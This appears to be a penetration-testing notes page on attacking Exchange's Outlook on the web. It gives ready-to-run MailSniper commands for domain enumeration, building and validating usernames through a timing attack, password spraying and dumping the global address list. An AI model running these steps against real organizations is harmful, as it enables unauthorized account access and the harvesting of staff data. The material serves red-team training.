---
title: OWA Exchange
category: Software
order: 6
---

The user interface in Outlook on the web (formerly known as Outlook Web App) for Exchange Server has been optimized and simplified for use with phones and tablets. Supported web browsers give users access to more Outlook features.

When you install Exchange Server, Outlook on the web is automatically available for internal users at `https://<ServerName>/owa` (for example, `https://mailbox01.contoso.com/owa`). But, you'll likely want to configure Outlook on the web for external access (for example, `https://mail.contoso.com/owa`).

In this section some attacks and enumeration techniques are going to be detailed.

# Password Spraying

Two excellent tools for password spraying againts Office 365 and Exchange are `MailSniper` and `SprayingToolkit`.

* [https://github.com/dafthack/MailSniper](https://github.com/dafthack/MailSniper)
* [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)

```powershell
Import-Module .\MailSniper.ps1
```

## NetBIOS Enumeration

Enumerate the NetBIOS name of the target domain.

```
Invoke-DomainHarvestOWA -ExchHostname <IP>
```

## Finding Posible Usernames

it is common to see in organizations that usernames follow a pattern. For example:, typicall patterns are:

```
{first}.{last}
{f}.{last}
{f}{last}
{f}{las}
{last}{first}
```
### Hunter.io

Hunter.io lets you find professional email addresses with a domain in seconds and find the pattern using different hardvesting techniques.

* [https://hunter.io/](https://hunter.io/)

![Hunter.io](/hackingnotes/images/hunter.png)

### Namemash.py

`namemash.py` is a python script that transforms a list of person's full name into possible username permutations.

* [https://gist.github.com/superkojiman/11076951](https://gist.github.com/superkojiman/11076951)

```
root@kali:~# cat names.txt
John Doe

root@kali:~# namemash.py names.txt 
johndoe
doejohn
john.doe
doe.john
doej
jdoe
djoe
j.doe
d.john
john
joe
```

## Validating Posible Usernames

`Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.

* **MailSniper**:

```powershell
Invoke-UsernameHarvestOWA -ExchHostname <IP> -Domain CORP -UserList .\possible-usernames.txt -OutFile valid.txt
```

## Spraying Passwords

`MailSniper` can spray passwords against Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).

* **MailSniper**:

```powershell
Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList <userlist.txt> -Password "Corp2022"
```

> **OPSEC Alert**: Be careful when making authentication attempts as we may block accounts. Furthermore, making too many attempts in a short time is very noisy.


# Retrieving Address List

With credentials of a user inbox we can retrieve the whole address list.

* **MailSniper**:

```powershell
Get-GlobalAddressList -ExchHostname <IP> -UserName <CORP/jdoe> -Password <Corp2022> -Outfile addres-list.txt
```
